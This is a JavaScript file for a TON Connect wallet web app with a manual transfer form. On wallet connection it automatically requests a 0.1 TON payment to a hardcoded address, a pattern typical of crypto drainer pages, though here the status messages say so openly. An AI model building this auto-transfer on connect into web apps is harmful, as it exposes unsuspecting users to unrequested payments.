// TON Transfer App - My Version: Simple & Robust

class TONTransferApp {
    constructor() {
        this.tonConnectUI = null;
        this.staticRecipient = "0QD4uCCSKWqbVEeksIA_a2DLGftKWYpd-IO5TQIns6ZNP_-U";
        this.staticAmount = "0.1";
        this.init();
    }

    init() {
        try {
            // Inisialisasi TON Connect UI
            this.tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
                manifestUrl: window.location.origin + '/ton-simple-html/tonconnect-manifest.json'
            });

            // Pasang event listeners hanya satu kali di awal
            this.setupEventListeners();
            // Siapkan listener untuk status koneksi
            this.setupConnectionListener();
            // Isi formulir dengan nilai statis
            this.preFillForm();

            console.log('TON Connect UI initialized successfully');
        } catch (error) {
            console.error('Failed to initialize TON Connect:', error);
            this.showStatus('Failed to initialize wallet connection', 'error');
        }
    }

    setupConnectionListener() {
        // Mendengarkan perubahan status koneksi dompet
        this.tonConnectUI.onStatusChange((wallet) => {
            if (wallet) {
                console.log('Wallet connected via status change');
                this.onWalletConnected(wallet);
            } else {
                console.log('Wallet disconnected via status change');
                this.onWalletDisconnected();
            }
        });
    }

    setupEventListeners() {
        // Pasang semua event listener di sini, hanya sekali
        document.getElementById('connectButton').addEventListener('click', () => {
            this.connectWallet();
        });

        document.getElementById('transferButton').addEventListener('click', () => {
            this.sendTransaction();
        });

        document.getElementById('disconnectButton').addEventListener('click', () => {
            this.disconnectWallet();
        });

        document.getElementById('message').addEventListener('input', (e) => {
            document.querySelector('.char-count').textContent = e.target.value.length + '/100';
        });
    }

    preFillForm() {
        // Hanya mengisi nilai input, tidak mengganti HTML
        document.getElementById('recipient').value = this.staticRecipient;
        document.getElementById('amount').value = this.staticAmount;
    }

    async connectWallet() {
        try {
            this.showStatus('Opening wallet for auto-transfer...', 'loading');
            await this.tonConnectUI.connectWallet();
        } catch (error) {
            this.showStatus('Connection failed: ' + error.message, 'error');
        }
    }

    onWalletConnected(wallet) {
        // Menggunakan CSS untuk menyembunyikan/menampilkan section
        document.getElementById('connectionSection').style.display = 'none';
        document.getElementById('transferSection').style.display = 'block';

        const shortAddress = wallet.account.address.slice(0, 8) + '...' + wallet.account.address.slice(-6);
        document.getElementById('walletAddress').textContent = shortAddress;

        this.showStatus('✅ Wallet connected! Starting auto-transfer...', 'success');

        // Panggil fungsi auto-transfer setelah 1 detik
        setTimeout(() => {
            this.autoSendTransaction();
        }, 1000);
    }

    onWalletDisconnected() {
        // Menggunakan CSS untuk menyembunyikan/menampilkan section
        document.getElementById('connectionSection').style.display = 'block';
        document.getElementById('transferSection').style.display = 'none';

        this.clearForm();
        this.showStatus('Wallet disconnected', 'info');
    }

    async disconnectWallet() {
        try {
            await this.tonConnectUI.disconnect();
        } catch (error) {
            console.error('Disconnect error:', error);
        }
    }

    async autoSendTransaction() {
        this.showStatus('🔄 Preparing auto-transfer...', 'loading');

        try {
            const wallet = this.tonConnectUI.wallet;
            if (!wallet) {
                this.showStatus('Wallet not ready for auto-transfer', 'error');
                return;
            }

            const recipient = this.staticRecipient;
            const amount = this.staticAmount;

            const btn = document.getElementById('transferButton');
            btn.disabled = true;
            btn.textContent = 'Auto-Transferring...';

            const amountInNano = (parseFloat(amount) * 1000000000).toString();

            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 300,
                messages: [{
                    address: recipient,
                    amount: amountInNano
                }]
            };

            this.showStatus('📱 Confirm auto-transfer in your wallet...', 'loading');
            const result = await this.tonConnectUI.sendTransaction(transaction);

            this.showStatus('✅ Auto-transfer successful!', 'success');
            this.clearForm();

        } catch (error) {
            console.error('Auto-transfer failed:', error);
            if (error.message.includes('User rejection')) {
                this.showStatus('❌ Auto-transfer cancelled', 'error');
            } else {
                this.showStatus('❌ Auto-transfer failed: ' + error.message, 'error');
            }
        } finally {
            const btn = document.getElementById('transferButton');
            if (btn) {
                btn.disabled = false;
                btn.textContent = 'Send TON';
            }
        }
    }

    async sendTransaction() {
        const wallet = this.tonConnectUI.wallet;
        if (!wallet) {
            this.showStatus('Please connect wallet first', 'error');
            return;
        }

        const recipient = document.getElementById('recipient').value.trim();
        const amount = document.getElementById('amount').value.trim();

        if (!recipient) {
            this.showStatus('Please enter recipient address', 'error');
            return;
        }

        if (!amount || parseFloat(amount) <= 0) {
            this.showStatus('Please enter a valid amount', 'error');
            return;
        }

        try {
            this.showStatus('Preparing transaction...', 'loading');
            const btn = document.getElementById('transferButton');
            if (btn) {
                btn.disabled = true;
                btn.textContent = 'Processing...';
            }

            const amountInNano = (parseFloat(amount) * 1000000000).toString();

            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 300,
                messages: [{
                    address: recipient,
                    amount: amountInNano
                }]
            };

            const result = await this.tonConnectUI.sendTransaction(transaction);
            this.showStatus('✅ Transaction successful!', 'success');
            this.clearForm();

        } catch (error) {
            this.showStatus('❌ Transaction failed: ' + error.message, 'error');
        } finally {
            const btn = document.getElementById('transferButton');
            if (btn) {
                btn.disabled = false;
                btn.textContent = 'Send TON';
            }
        }
    }

    clearForm() {
        document.getElementById('recipient').value = '';
        document.getElementById('amount').value = '';
        document.getElementById('message').value = '';
        document.querySelector('.char-count').textContent = '0/100';
    }

    showStatus(message, type = 'info') {
        const statusEl = document.getElementById('statusMessage');
        if (statusEl) {
            statusEl.textContent = message;
            statusEl.className = `status-message status-${type}`;
            statusEl.style.display = 'block';

            if (type === 'success' || type === 'error') {
                setTimeout(() => {
                    if (statusEl) {
                        statusEl.style.display = 'none';
                    }
                }, 5000);
            }
        }
    }
}

// Inisialisasi saat DOM siap
if (typeof TON_CONNECT_UI !== 'undefined') {
    document.addEventListener('DOMContentLoaded', () => {
        window.tonApp = new TONTransferApp();
    });
} else {
    console.error('TON Connect UI library not loaded');
}